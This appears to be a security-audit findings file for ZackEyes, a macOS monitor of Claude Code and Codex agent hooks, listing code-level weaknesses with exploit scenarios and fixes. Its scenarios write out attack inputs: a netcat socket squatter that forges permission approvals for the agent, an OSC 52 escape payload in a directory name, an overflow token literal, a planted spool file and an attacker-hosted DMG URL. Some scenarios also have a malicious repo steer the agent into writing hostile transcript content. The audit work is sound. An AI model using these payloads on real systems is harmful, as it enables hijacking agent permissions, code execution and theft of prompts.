focus_areas: Socket/IPC authorization (EP1/EP2/EP3, T1): SocketServer accept loop, BridgeEvent/AnyCodable decode, resolvePermission/isToolAutoAllowed, PendingEventReplayer
Bridge CLI input handling (EP4, T1/T7): Bridge/main stdin+argv, SocketClient, PendingEventQueue, TTYUtil
Untrusted-text injection sinks (EP5/EP11, T5): NotchExpandedView, AppDelegate.handleEvent, TerminalTitleWriter, NotificationManager, sanitizePrompt
Launcher/helper resolution & hook install (EP8, T3): HookInstaller, CodexHookInstaller, HookRepair, HookHealth, IntegrationUninstaller
Transcript/cache readers & missing-timeouts (EP5/EP6, T6/T7): SessionScanner, CodexJsonlTailer, TaskExtractor, UsageTracker, PricingStore, ConfigStore
Terminal AX / Apple Events actuation (EP7, T4): TerminalLocator process scan, AXUIElement, NSAppleScript, tty title write

findings.title: Codex daily-token scan reads each rollout fully via uncapped String(contentsOf:) on a 30s-recurring scan
findings.description: scanCodexDailyTokens parses every codex rollout modified within the 7-day window by reading the whole file: `else if let text = try? String(contentsOf: file, encoding: .utf8)` (line 511), then parseCodexDailyTallies does text.split(separator: "\n"). No fileSize ceiling, no symlink guard, even though the function already fetches .fileSizeKey for its (mtime,size) cache key (lines 500-502, 509). The 256MB cap from aba2176 lives only in the Claude computeSnapshot path (maxTranscriptBytes line 559 + shouldScanTranscript line 612, which also blocks symlinks); the codex path has neither. codex rollout JSONL under ~/.codex/sessions/.../ is attacker-influenceable (agent/tool output; same-uid writable). refresh() runs this scan every 30s (start(intervalSeconds:30), line 209). An actively-grown rollout changes size every tick, defeating the per-file cache (which only short-circuits unchanged files), so it is re-read whole every 30s. The author was explicitly aware of this exact threat (the maxTranscriptBytes comment cites 'a multi-GB read on every 30s refresh') and applied the fix to only one of two structurally-identical scan paths.
findings.exploit_scenario: A same-uid process writes a 5GB rollout-...jsonl with a recent mtime into ~/.codex/sessions/2026/06/19/. Every 30s refresh() calls scanCodexDailyTokens which String(contentsOf:)-reads the entire 5GB into memory to tally daily tokens, producing a sustained periodic memory spike; while the file grows, the cache misses and the full re-read repeats each tick.
findings.recommendation: Gate the read on the already-fetched size: skip (or tail-read) files larger than a ceiling (reuse maxTranscriptBytes) and skip symbolic links, i.e. apply shouldScanTranscript(isSymbolicLink:fileSize:) here exactly as the Claude scan does. Daily tallies are append-only, so a bounded read is viable.
findings.confidence_reason: Verified uncapped String(contentsOf:) at line 511 with file size already in hand but ungated, on a 30s timer; an exact sibling gap to the documented 256MB cap/symlink gate the author applied only to the Claude path.

findings.title: TaskExtractor reads the entire transcript JSONL with uncapped Data(contentsOf:) — bypasses the 256MB cap added in aba2176
findings.description: extractTasks(fromTranscriptAt:) reads the whole file with `Data(contentsOf: URL(fileURLWithPath: path))` (line 18), then String(data:encoding:) (a second full copy) and split(separator: "\n") — no size ceiling, no symlink check. The prior fix (aba2176) added the 256MB ceiling + symlink skip ONLY to UsageTracker; this sibling reader was not touched (SessionScanner and CodexJsonlTailer use bounded reads of 65536/1048576 bytes — TaskExtractor is the lone whole-file reader on this path). The transcript path is attacker-influenceable: (1) live — SessionStore.handleEvent calls extractTasks on every PostToolUse of any tool whose name hasPrefix("Task"), with path = session.transcriptPath ?? event.transcriptPath from hook input (SessionStore.swift:287-291); (2) detected — importDetectedSessions calls it for every imported session using the scanner-discovered jsonl path (SessionStore.swift:679-680), re-fed on the periodic mtime-gated rescan. Transcript content is LLM/tool output a malicious repo can bloat, or a same-uid process can grow/plant a multi-GB jsonl. Each Task* PostToolUse re-reads the full file → repeated multi-GB allocations on the main session-handling path → memory-pressure DoS (T7).
findings.exploit_scenario: A user runs Claude Code in an attacker-controlled repo; the agent is induced to use Task tools and emit a very large transcript, or a co-resident same-uid process appends ~4GB to the active jsonl. On the next Task* PostToolUse, extractTasks Data(contentsOf:)-reads the entire ~4GB, spiking RSS and stalling/killing the app; the read repeats per Task PostToolUse.
findings.recommendation: Route this read through the same bounded helper as the transcript scan: stat first, skip symlinks and files over maxTranscriptBytes, and read at most a bounded tail with a FileHandle (the task list only needs the current turn, as parseClaudeSession already does with readTail(maxBytes:)).
findings.confidence_reason: Verified uncapped Data(contentsOf:) with no symlink/size guard on two attacker-influenceable, repeatedly-invoked paths, standing in clear contrast to the explicit 256MB+symlink cap in the sibling UsageTracker — a genuine, defensible gap.

findings.title: Crafted token-count fields cause a Swift Int overflow trap (crash-loop) during usage summation
findings.description: Token fields are parsed straight from untrusted JSON into Int and summed/accumulated with the trapping +/+= operators, no clamping. In parseFileRecords, input/output/cacheRead/cacheCreate come from `usage[...] as? Int` (lines 689-692); JSONSerialization decodes an integer literal that fits in Int64 into an Int-backed NSNumber, so as? Int succeeds up to Int.max. In computeSnapshot, `let total = r.input + r.output + r.cacheRead + r.cacheCreate` (line 630) and `tokens7d += total` / `tokens5h += total` (631,634) use checked (trapping) arithmetic — Swift aborts the process on signed overflow (deterministic SIGTRAP, not memory corruption). The daily fold has the same shape (DailyUsage.swift:72,154-156). A single Claude transcript line with `"usage":{"input_tokens":9223372036854775807,"output_tokens":1}` makes r.input = Int.max and r.input + r.output traps on the first record. computeSnapshot runs on the 30s refresh() cycle, so the crash re-triggers every tick and on every relaunch while the malicious line stays in the cutoff window.
findings.exploit_scenario: An attacker-controlled repo gets the agent to write one assistant JSONL line with `"usage":{"input_tokens":9223372036854775807,"output_tokens":5}`; within 30s computeSnapshot evaluates r.input + r.output, which overflows Int and traps — the app crashes on every relaunch while the line stays in the mtime window, persistently disabling the permission/usage UI.
findings.recommendation: Parse token fields defensively: reject negatives and absurd magnitudes at parse time (cap to a sane per-message ceiling), and use overflow-safe accumulation (Int(clamping:) / addingReportingOverflow, or saturating &+ with a cap) in the folds at UsageTracker.swift:630-635 and DailyUsage.swift:72,154-156.
findings.confidence_reason: Code reads exactly as described — untrusted as? Int token fields summed with trapping +/+=, no clamping, on a 30s timer; a single near-Int.max literal deterministically traps computeSnapshot, a clean reportable availability crash-loop.

findings.title: cwd basename embedded raw into OSC-2 tab-title write — sibling sink the prompt-sanitize fix missed
findings.description: The cf61a5d/4754dba fix routes the prompt portion of the OSC-2 title through sanitizePrompt (which strips C0/DEL incl. ESC 0x1B and BEL 0x07), but the basename portion is interpolated raw. formatTitle(cwd:sessionId:prompt:) computes `basename = (cwd as NSString).lastPathComponent` (line 51) and interpolates it unsanitized into the returned title at lines 56 and 59. writeIfPossible (lines 98-99) feeds that title to oscEscape which builds `ESC ]2; <title> BEL` (line 65) and writes the bytes to another process's tty (lines 103-108). cwd is attacker-influenceable: it comes straight from the hook JSON — Bridge/main.swift:87-88 passes jsonObject["cwd"] in with no validation. On macOS/APFS a directory name may contain any byte except / and NUL, including ESC and BEL. A basename carrying an attacker-chosen BEL/ESC terminates the title early and injects follow-on escape sequences (cursor moves, OSC 52 clipboard, hyperlinks, on some terminals title-report-back) into the victim terminal — the exact class the prompt-sanitize fix was meant to close, reached via a different field on the identical sink. The author's own sanitizePrompt doc-comment proves intent.
findings.exploit_scenario: A user opens a repo whose working directory (or a subdir the agent enters) is named e.g. `proj\x07\x1b]52;c;<base64-payload>\x07` (NUL/'/'-free, valid macOS dirname). When the bridge fires any hook, writeIfPossible builds the OSC string with the raw basename; the leading BEL closes the OSC-2 title and the terminal interprets the injected OSC 52 as a clipboard write (or any other sequence), with no prompt content required.
findings.recommendation: Run the basename through the same sanitizer before interpolation in both formatTitle (line 51) and TerminalLocator.sessionTitle (line 284). Better: sanitize the whole composed title once inside oscEscape/writeIfPossible immediately before the tty write so no field bypasses it regardless of future call sites; also strip C1 (0x80-0x9F) and the 2-byte ST.
findings.confidence_reason: Confirmed unsanitized cwd basename interpolated raw into an OSC-2 write to another process's tty, source is untrusted hook JSON, and the sibling prompt path is explicitly sanitized for the same ESC/BEL bytes — a clear, author-acknowledged injection sink with only terminal-honors-sequence as a mild caveat.

findings.title: Second OSC-2 writer (TerminalLocator.writeSessionTitle) also embeds raw cwd basename into the tty escape
findings.description: TerminalLocator is the app-side OSC-2 writer (used by AppDelegate.activateDetectedSessions:377, activateCodexSession:901, NotchViewModel.activateTerminal:104). sessionTitle(cwd:sessionId:prompt:) sanitizes the prompt via sanitizeTitlePrompt (line 286) but interpolates `basename = (cwd as NSString).lastPathComponent` (line 284) raw into the title at lines 288/290. writeSessionTitle builds `osc = "\u{001B}]2;\(title)\u{0007}"` (line 302) and writes it to the resolved tty FileHandle (304-307). Same root cause as F-004 but on the independent app-side writer; fixing only one leaves the other exploitable. cwd originates from untrusted scanned transcript metadata — SessionScanner reads it verbatim from the JSONL `cwd` field (SessionScanner.swift:114-115, codex at :262) with no path validation, flowing through SessionInfo.cwd unmodified. The detected-session path auto-runs at AppDelegate:320 right after the import scan and re-runs on the periodic sweep (:511) — no user click required.
findings.exploit_scenario: ZackEyes scans ~/.claude/projects or a codex rollout, reads a session whose cwd basename contains BEL+escape bytes, and on automatic title injection (activateDetectedSessions → writeSessionTitle) emits the attacker's escape sequence to the terminal tty hosting that session.
findings.recommendation: Sanitize the basename in sessionTitle (line 284): `let basename = sanitizeTitlePrompt((cwd as NSString).lastPathComponent)` (no-truncate variant). Ideally collapse the two duplicate OSC builders into one shared helper that sanitizes the entire composed title before the write.
findings.confidence_reason: Independent app-side OSC-2 writer interpolates the unsanitized cwd basename (attacker-controlled via scanned transcript metadata) raw into an escape string written to a tty, auto-triggered after scan with no user interaction.

findings.title: Bridge connects to /tmp/zackeyes.sock with no peer authentication and returns the reply verbatim as the agent's permission decision
findings.description: The bridge connects to a fixed world-writable-directory path /tmp/zackeyes.sock (main.swift:94, BridgeSocketClient.connect at SocketClient.swift:19-49) and performs NO authentication of the listening peer. The server authenticates its clients via getpeereid (SocketServer.swift:134-135), but that gate protects the app from rogue clients, not the bridge from a rogue server — the bridge trusts whatever is bound at that path. For a PermissionRequest the bridge sends the hook JSON and writes the socket's raw reply verbatim to stdout (main.swift:119-122) with no validation of the reply shape; Claude Code obeys that stdout as the allow/deny decision. /tmp is world-writable (sticky bit). When the legit app is not running, another local USER can bind their own AF_UNIX socket at /tmp/zackeyes.sock before the app starts; the app's startup unlink (SocketServer.swift:60-61) cannot remove a sticky-bit /tmp file owned by another uid (EPERM), so the subsequent bind fails (EADDRINUSE) and the squatter persists. There is also no wall-clock timeout (timeoutSeconds:0 → poll(-1), SocketClient.swift:101), so the squatter can additionally hang the agent's PermissionRequest indefinitely. Cross-uid privilege boundary (a different local user) — not merely the accepted same-uid trust.
findings.exploit_scenario: On a multi-user macOS host (CI runner, lab box, shared workstation), attacker user B runs `nc -lU /tmp/zackeyes.sock` before victim A launches the app. When A's Claude Code fires a PermissionRequest, the bridge connects to B's socket (leaking A's prompt/cwd/transcript_path) and B replies with an allow decision; the agent auto-approves the dangerous tool. Or B never replies, hanging A's agent on every permission request.
findings.recommendation: Move the socket out of world-writable /tmp into a per-user mode-0700 directory the attacker cannot pre-create. On the bridge (client) side, after connect() verify the peer with getpeereid and reject if peerEUID != geteuid(), mirroring the server. Validate the reply: JSON-decode into PermissionResponse and only write stdout if it parses to the expected shape; add a finite wall-clock ceiling so a non-responsive/hostile peer fails open to CC's own prompt rather than hanging the agent.
findings.confidence_reason: Client-side peer-auth gap, verbatim-stdout-as-decision, sticky-/tmp persistence, and infinite poll are all code-confirmed; real and actionable, but HIGH leans on a multi-user-macOS + pre-start-race precondition uncommon for this single-user app.

findings.title: Pending-event spool writes raw hook JSON (prompts, cwd, transcript paths) with default permissions in a world-traversable dir
findings.description: When the app socket is unreachable, the bridge spools the raw hook payload to ~/.zackeyes/pending/*.json (main.swift:149-151 → PendingEventQueue.enqueueIfEligible). The directory is created via `fm.createDirectory(atPath:withIntermediateDirectories:true)` with NO attributes: argument (lines 42-44), so the dir mode is umask-governed (commonly 0755). Files are written via `payload.write(to:options:.atomic)` (line 49), also umask-governed (commonly 0644, world-readable). The payload is the raw enriched hook JSON — user prompt, cwd, transcript_path, session metadata; UserPromptSubmit is in replayableEvents, so literal prompt text is spooled. Verified on this machine: home is drwxr-xr-x (0755, world-traversable, NOT 0700), umask 022, and ~/.zackeyes/pending already exists at 0755 — so cross-uid read of ~victim/.zackeyes/pending/*.json (0644) is genuinely reachable. By contrast the socket node is deliberately locked to 0o600 (SocketServer.swift:90) and the code treats other-uid access as a boundary — yet the spool persisting the same content to disk gets no hardening. Confidentiality (T6) gap.
findings.exploit_scenario: Victim runs Claude Code while the ZackEyes app is closed (a normal state). The bridge spools UserPromptSubmit/SessionStart events to ~/.zackeyes/pending/<ts>-<pid>-<uuid>.json at 0644 inside a 0755 dir. A second local user reads them and harvests the victim's prompts, working directories, and transcript-file locations until the app next starts and replays+deletes them.
findings.recommendation: Create the spool directory with attributes: [.posixPermissions: 0o700] and write files at 0o600 (write then chmod, or FileManager.createFile with posixPermissions). Mirror the 0o600 intent already applied to the socket node; consider not persisting raw prompt/transcript content at all.
findings.confidence_reason: Verified umask-governed 0644 spool of raw prompts/cwd/transcript paths in a world-traversable 0755 dir (home confirmed 0755, not 0700) with no chmod anywhere; cross-uid read is real and the code's own 0o600 socket lock shows the boundary was intended.

findings.title: Notification title bypasses sanitization entirely and the body sanitizer strips no control/bidi characters
findings.description: Two gaps in the notification sink. (1) The TITLE is raw-interpolated with no sanitizer: `content.title = "⚠️ \(agentTag) \(projectName) — \(errorLabel)"` (line 98) and `"\(agentTag) \(projectName) — done"` (line 133). projectName is session.displayName (SessionStore.swift:56-61) = the cwd basename — the same attacker-influenceable field as F-004/F-005. (2) NotificationManager.sanitizePrompt (lines 186-199), used for the BODY, is a distinct, weaker function from the OSC sanitizePrompt despite the shared name: it only trims whitespace, drops the string if it both hasPrefix("<") and contains("</") (an XML heuristic), and truncates — it strips NO control/bidi/C1 characters. ESC, BEL, newlines, U+202E (RTL override), and zero-width chars all pass into content.body, sourced from lastUserPrompt/lastAssistantMessage/codex lastAgentMessage. macOS Notification Center renders plain text (no OSC/CSI execution), so the realistic impact is notification-UI spoofing: bidi/RTL-override or zero-width characters in the title/body can misrepresent which project/agent fired, raising click-through; the tap handler then calls onSessionTap(sessionId) (AppDelegate.swift:217-226) for the attacker-chosen session.
findings.exploit_scenario: A malicious repo plants a first user prompt (or the agent quotes attacker content) containing a U+202E RTL override, or a cwd named with a bidi override. On session finish, notifySessionFinished posts a notification whose title (cwd basename, unsanitized) or body (control chars not stripped) visually reorders to impersonate a different project/agent, increasing the chance the user taps — and the tap activates the terminal for the attacker-chosen sessionId.
findings.recommendation: Sanitize the notification title with the same control-char-stripping routine used for OSC (strip C0/C1/DEL and Unicode bidi/format controls), and have the body sanitizer strip control and bidi-override characters in addition to its existing logic. Rename one of the two sanitizePrompt functions to remove the false equivalence, and centralize control-char stripping in one shared helper used by every untrusted-text sink.
findings.confidence_reason: Every code claim verified exactly (unsanitized title, weak body sanitizer stripping no control/bidi chars, cwd-basename source); finding self-corrects the escape-injection framing to honest UI-spoofing, so it survives as a real-but-soft MEDIUM.

findings.title: kqueue tailer's pendingBuffer grows without bound on a rollout line that never ends in a newline
findings.description: The incremental parser accumulates an unbounded partial-line buffer. parseTaskLifecycleEvents does `let combined = pending + chunk`, splits on \n, sets `pending = parts.last`, and returns the complete lines (lines 251-258). The trailing partial line is carried in pendingBuffer (Watcher instance var, line 461) across kqueue write events, with no cap. The watched file is a live codex rollout (attacker-influenceable). On each .write event, readNewBytes reads all bytes past offset and feeds them as chunk (lines 609-625). If a writer appends a large quantity of bytes with no \n (a single pathological JSONL line, e.g. a multi-hundred-MB string field), every chunk has parts.count==1, completeLines is empty, and the entire content stays in pending; successive writes keep concatenating (`pending + chunk`), growing the buffer to ~GB with O(n^2) recopy. Head reads ARE bounded (readFirstLine caps at 1048576, parseInitialTurnContext at 1100000) — only the tail-streaming pendingBuffer is unbounded.
findings.exploit_scenario: A same-uid process opens the active rollout ZackEyes is tailing and appends an 800MB line with no newline; kqueue fires .write; readNewBytes reads the appended bytes and the parser stuffs all of it into pendingBuffer, growing to hundreds of MB/GB with repeated string concatenation copies — memory-pressure DoS / app stall.
findings.recommendation: Cap pendingBuffer: if its length exceeds a sane line ceiling (a few MB), drop the unparsable partial line (reset pending = "") and skip ahead, optionally cancelling the watcher. Also consider a per-chunk read cap in readNewBytes so a single .write burst can't pull an unbounded slice into memory.
findings.confidence_reason: Code verified exactly as described — pendingBuffer has no cap, grows via pending=combined / pending+chunk on each newline-free .write while head reads are explicitly bounded; genuine unbounded-buffer DoS, only softened by requiring a same-uid local writer.

findings.title: Launcher execs app bundle from same-uid-writable .app-path marker with no code-signature or allowlist validation
findings.description: deployLauncherScript writes a /bin/sh launcher to ~/.zackeyes/bin/bridge invoked on every Claude/Codex agent hook fire. Its first resolution step reads the marker ~/.zackeyes/.app-path and execs whatever it names: `try_app()` validates only that ${P}/Contents/Helpers/bridge is executable (line 253), then `exec "$B"` (line 256). No code-signature check (a grep of the tree confirms ZERO SecStaticCode/SecCode/codesign/kSecCS). The marker is same-uid-writable (written with default permissions line 278, parent dir created with default perms line 235 — no 0600/0700). Any process running as the user (a malicious npm/pip dependency, a compromised CLI) overwrites the marker to point at an attacker-controlled bundle; on the very next agent hook event the launcher execs attacker.app/Contents/Helpers/bridge as the user. On success line 255 rewrites the marker with the resolved path, pinning the compromise. This is a code-confirmed instantiation of the documented-unmitigated threat T3 (EP8).
findings.exploit_scenario: A malicious dev dependency creates ~/.cache/x.app/Contents/Helpers/bridge (a script that installs a persistent backdoor then re-execs the real app to stay silent) and writes ~/.cache/x.app into ~/.zackeyes/.app-path. The next time any hook event fires, the planted bridge executes as the user — persistent code execution that re-fires on every subsequent hook.
findings.recommendation: Before exec, validate the resolved bundle's code signature against ZackEyes' Designated Requirement (codesign --verify -R, or a small verifier). Lock down the marker and dir (create ~/.zackeyes and bin 0700, write .app-path 0600) and refuse to read the marker if it or its parent is writable by anyone but the owner. Prefer baking the absolute install path into the script at deploy time and treating the mutable marker as a non-authoritative hint.
findings.confidence_reason: Code-confirmed: launcher execs marker-named bundle with only [-x], zero codesign found, marker+dir at default perms; persistent same-uid code-exec re-firing every hook — credible and concrete, but the threat model already lists EP8/T3 as a known unmitigated same-uid threat, so it is a verified restatement rather than a novel discovery.

findings.title: Directly-exec'd launcher, its bin dir, and the .app-path marker created with default permissions — no 0700/0600 lockdown
findings.description: The launcher at ~/.zackeyes/bin/bridge is exec'd on every agent hook fire, yet nothing restricts write access to it or its steering inputs. ~/.zackeyes/bin is created with `createDirectory(..., attributes: nil)` (lines 235-239) → default mode (umask, typically 0755). The scripts are written then `setAttributes([.posixPermissions: 0o755])` (lines 381-383) — world-readable, owner-writable. The .app-path marker is written via `write(toFile:atomically:encoding:)` (lines 278-282) with NO permission attributes. Grep confirms the only restrictive mode in this subsystem is 0o600 on the unix socket; the hooks subsystem has no 0o700/0o600. This is worse than generic hardening because the file at ~/.zackeyes/bin/bridge is directly executed by the agent every hook fire (wired as the command for PreToolUse/SessionStart/Stop/StatusLine, line 421). Overwriting the launcher SCRIPT BODY (distinct from marker poisoning, F-010) replaces the entire executed body with any /bin/sh payload, with no [-x]/bundle-structure constraint.
findings.exploit_scenario: Same-uid malware overwrites ~/.zackeyes/bin/bridge with its own /bin/sh payload (the dir is writable, the file owner-writable). Every PreToolUse/SessionStart/Stop hook now runs the attacker script as the user, repeatedly and persistently — no privilege boundary needs to be crossed.
findings.recommendation: Create ~/.zackeyes and ~/.zackeyes/bin mode 0700 (set explicitly, don't rely on umask). Write the launcher 0700 and the marker 0600. On each deploy/health pass, verify the dir, launcher, and marker are owned by the current uid and not group/other-writable, and refuse to trust/exec them otherwise.
findings.confidence_reason: All file facts verified and the directly-exec'd-every-hook-fire launcher-body-overwrite is a real distinct vector beyond marker poisoning, but the same-uid trust model and OS-default-perms framing make the permissions-only angle partly foldable into the overlapping marker finding.

findings.title: Launcher execs first mdfind result by bundle identifier with no signature verification
findings.description: When the marker and the fixed fallback paths don't resolve, the launcher falls back to Spotlight: `P="$(/usr/bin/mdfind 'kMDItemCFBundleIdentifier == "app.zackeyes.macos"' | head -n 1)"; try_app "$P"` (lines 268-271). mdfind returns any indexed bundle whose CFBundleIdentifier is app.zackeyes.macos; head -n1 takes the first; try_app execs ${P}/Contents/Helpers/bridge with the same no-validation flow as F-010 (only [-x], then exec). The bundle identifier is public (Info.plist), so any same-uid attacker can author a bundle with that identifier and a malicious bridge, drop it in a Spotlight-indexed location, and have it returned by mdfind. mdfind ordering is not authenticated and is attacker-influenceable (placement, mtime, index timing); no signature gate; line 255 then pins the path into the marker. Reachability is narrower than F-010 (the marker AND the fixed paths must miss — achievable if the legit app was moved/uninstalled, or the attacker empties the same-uid-writable marker to force the branch).
findings.exploit_scenario: On a host where the legit app was moved/uninstalled (marker + fixed paths miss), or where the attacker first empties the marker, the attacker creates ~/Documents/ZackEyes.app with CFBundleIdentifier=app.zackeyes.macos and a hostile bridge. Spotlight indexes it; the next hook fire runs the attacker's bridge as the user, and line 255 pins that path into .app-path.
findings.recommendation: Do not exec the bare mdfind result. Verify the candidate bundle's code signature / Designated Requirement before exec, and prefer matches that also satisfy a path policy (inside /Applications or the signed install dir). On verification failure, exit rather than execute an unverified bundle.
findings.confidence_reason: Real no-signature-check exec sink confirmed at the mdfind fallback, but it is a weaker variant of the marker-poisoning finding — needs the fixed paths to miss plus attacker-influenceable-but-unauthenticated Spotlight ordering, so credible rather than a clear standalone HIGH.

findings.title: DMG download URL taken verbatim from release JSON (browser_download_url) — a compromised release can point the download at ANY host
findings.description: The asset download URL is read directly from the untrusted JSON field browser_download_url (GitHubAsset.browserDownloadURL, UpdateChecker.swift:6,10) decoded from the GitHub /releases/latest response, then at line 99 `dmgURL = release.assets.first(where: { $0.name.hasSuffix(".dmg") })?.browserDownloadURL` selects the first asset whose NAME ends in .dmg and saves its browserDownloadURL with no validation that the host is github.com / objects.githubusercontent.com, no scheme check, and no name-URL relationship. dmgURL flows unchanged into UpdateDownloader.download(from:) → URLSession.shared.download(from: url) (UpdateDownloader.swift:52) → NSWorkspace.open (line 65). The only download-path guard is an HTTP-status check, which does not validate origin. This is the concrete code-level amplifier on the documented T2: a compromised release does not even need to host the malicious DMG on GitHub — the attacker controls the destination host entirely. Combined with quarantine stripped + ad-hoc signing, the opened DMG runs with no Gatekeeper gate.
findings.exploit_scenario: Attacker with release-repo or publish-token compromise edits the latest release JSON so the .dmg asset's browser_download_url points at https://evil.example/ZackEyes.dmg (a host they fully control, can rotate or geo-target). On the next 6h poll the app downloads attacker bytes and hands them to NSWorkspace.open — Finder mounts the attacker's disk image. The malware delivery host is decoupled from the trusted-looking GitHub release feed.
findings.recommendation: After selecting the asset, validate browserDownloadURL: require scheme == https and host in an allowlist (github.com, objects.githubusercontent.com, the release CDN). Better: ignore browser_download_url entirely and reconstruct the URL from the known repoOwner/repoName/tagName/asset-name so the host can never be attacker-chosen. (The deeper fix is in-app signature/checksum verification of the DMG before open.)
findings.confidence_reason: Code confirms unvalidated server-controlled download host flowing to NSWorkspace.open; the host-decoupling amplifier is real and code-grounded, but rides the documented T2 attacker/outcome, so it risks being merged as a sub-fact rather than standing fully independent.

findings.title: Health check trusts the writable .app-path marker by path-equality only, masking the marker-poisoning chain
findings.description: checkLauncherResolution (lines 172-188) reads the same same-uid-writable ~/.zackeyes/.app-path marker the launcher trusts and, if the marker's bundle resolves and resolvingSymlinksInPath-equals the running bundle, reports the launcher healthy. It performs no signature check and no permission/ownership check on the marker or the resolved bundle — pure path equality. It is read-only (no exec/re-deploy). The risk is that the Hook Status UI gives a green 'launcher resolves app' signal while the underlying marker/dir is fully attacker-rewritable (F-010/F-011): a poisoned marker pointing at an impostor whose path the attacker arranges to also satisfy the equality (symlink games, or after moving the real app) reports healthy, suppressing the one UI signal that might alert the user. It introduces no new exploit primitive; it is the detection-evasion tail of the marker-trust chain.
findings.exploit_scenario: After poisoning .app-path (F-010), the attacker symlinks their bundle path so resolvingSymlinksInPath collapses to the legitimate path, or simply relies on the user never opening Hook Status. The dashboard shows the integration as healthy while the launcher resolves through the attacker-influenced marker, lowering the chance the compromise is noticed.
findings.recommendation: Have the health check additionally verify the marker file and its directory are owner-only (0600/0700) and owned by the current uid, and verify the code signature of the resolved bundle; surface a distinct 'launcher resolution source is writable/unsigned' warning rather than a plain green check.
findings.confidence_reason: Code exactly matches the claim (writable-marker path-only equality, no signature/permission check, read-only), but it is a dependent LOW detection-evasion corollary of the marker-poisoning finding with no new primitive.

findings.title: Untrusted transcript_path passed to `lsof -t` without a `--` end-of-options guard
findings.description: lsofPids(file:) invokes `runWithTimeout("/usr/sbin/lsof", args: ["-t", file], ...)` (lines 265-266) where file is the agent's transcriptPath. That value originates from the untrusted socket event: BridgeEvent.transcriptPath is a free-form String? decoded from the transcript_path JSON key (EventProtocol.swift:166,190), stored verbatim in SessionInfo.transcriptPath, and reaches the sink via findClaudePid/findCodexPid → lsofPid(file:) → lsofPids(file:) (TerminalLocator.swift:52,70). No -- separator precedes the path and no validation rejects a leading -, so a value like -S / -i / +d is parsed by lsof as an option rather than a filename. This is argv-array invocation (no shell) so there is NO command injection — only option injection into lsof's flag set. lsof exposes no file-write or command-exec flags, so the realized impact is limited to altering which PID the locator resolves or causing the lookup to fail; not an RCE primitive.
findings.exploit_scenario: A compromised same-uid process sends a forged event with `"transcript_path":"-i"`; when the app resolves the agent PID it runs `lsof -t -i`, listing processes holding network sockets instead of the transcript writer, steering PID resolution toward an attacker-controlled process or breaking the lookup. No path to code execution.
findings.recommendation: Insert an end-of-options guard before the filename: `args: ["-t", "--", file]` (and likewise in batchProcessCwds/processCwd if any non-literal reaches them). Additionally reject transcriptPath values that do not begin with / before passing them to any subprocess.
findings.confidence_reason: Verified taint path and genuine missing-`--` guard, but argv-array + read-only lsof + same-uid precondition cap real impact at benign option-confusion — a credible but minor hardening finding.

findings.title: Pending-spool replay applies no event-type allowlist and no peer auth, letting a planted file spoof session state via the authenticated handler
findings.description: The WRITE side (PendingEventQueue.enqueueIfEligible, PendingEventQueue.swift:39-40) restricts spooling to replayableEvents (SessionStart/SessionEnd/Stop/UserPromptSubmit/Notification/PreCompact/PostCompact/SubagentStart/SubagentStop). The READ side (PendingEventReplayer.replayAll, lines 35-49) enforces NO such filter: it decodes and replays ANY bridgeEvent found on disk (only .json suffix, ≤24h age, and decodability), then hands it to AppDelegate.handleEvent — the exact handler the getpeereid-authenticated live socket routes to. A planted file is trusted purely because it exists. Reachable consequences via SessionStore.handleEvent: SessionStart with attacker session_id/cwd injects a fake session row (:230-233); Stop with a crafted last_assistant_message forces a fabricated error banner via detectError (the error notification is suppressed for isReplayed events, but the row's error state is still set); a replayed event with permission_mode 'bypassPermissions' stamps permissionRisk=.yolo (:368-374) — a forged risk badge, or clears a real one. NOTE (verified): a replayed PermissionRequest is NOT auto-approvable — replayAll calls handleEvent(event, responder: nil) and the PermissionRequest case early-returns when responder==nil (:550-553) — so this is state/UI spoofing of the security surface, not a direct tool grant.
findings.exploit_scenario: A same-uid process plants ~/.zackeyes/pending/<ts>-1-x.json = `{"_bridge_event":"Stop","session_id":"<real>","last_assistant_message":"429 too many requests rate limit"}`; on next launch the replayer feeds it to handleEvent and the session shows a forged error. Or it plants a SessionStart with permission_mode 'plan' to make a session appear read-only/safe in the badge while the real session is unconstrained, lowering the user's suspicion before they approve a request.
findings.recommendation: On the read side, enforce the same replayableEvents allowlist before dispatching a replayed event (reject/delete anything outside it). Store the spool in an app-created mode-0700 directory, and treat replayed events as lower-trust (never let a replayed event mutate permissionRisk).
findings.confidence_reason: Code-accurate — read-side allowlist genuinely absent vs an explicit write-side allowlist, and the badge/error spoofing paths verify (including the correctly-stated PermissionRequest non-grant caveat); impact is real security-surface spoofing but capped by same-uid being trusted by design.

findings.title: Pending-spool replay reads unbounded file size and feeds it to recursive AnyCodable decode
findings.description: replayAll (lines 27-52) enumerates ~/.zackeyes/pending/*.json and for each does `Data(contentsOf: URL(fileURLWithPath: path))` (line 43) with NO size cap, then `JSONDecoder().decode(BridgeEvent.self, ...)` (line 44). The live socket path caps accumulation at 65536 bytes (SocketServer.swift:148) before decoding the identical BridgeEvent type; the prior fix (aba2176) added the 64KiB socket cap + 256MB transcript cap but left the spool replay with no ceiling. BridgeEvent contains five [String: AnyCodable]? fields; AnyCodable.init(from:) recurses per array element and object value (EventProtocol.swift:48,50). Replay runs synchronously on the @MainActor during applicationDidFinishLaunching (AppDelegate.swift:82). A same-uid process can plant a huge flat array/object to force a large allocation at every startup. (The stack-exhaustion-via-deep-nesting variant is weaker: Foundation's native JSON parser likely traps over-nesting before the Codable recursion blows the stack, so the clean crash is the allocation/volumetric variant from a same-uid writer.)
findings.exploit_scenario: A compromised same-uid dependency writes ~/.zackeyes/pending/<...>.json containing a multi-hundred-MB nested/flat JSON value. On the next ZackEyes launch, replayAll reads the whole file and the decode allocates against it on the main actor at startup, spiking memory before the notch UI comes up.
findings.recommendation: Apply the same input bound the live socket uses: stat the file and skip any pending JSON over a small ceiling (64KiB — real spooled events are well under 1KiB) before Data(contentsOf:). Additionally cap JSON nesting depth in AnyCodable.init(from:) by threading a depth counter and throwing past a small limit, which also protects the live socket path.
findings.confidence_reason: Real unbounded-read sibling gap to a just-shipped fix and recursion is genuine, but JSONDecoder's native parser likely traps deep nesting before stack exhaustion and the only clean crash is allocation DoS from a same-uid (trusted-by-design) writer.

findings.title: Download destination filename derived from server-controlled URL last path component
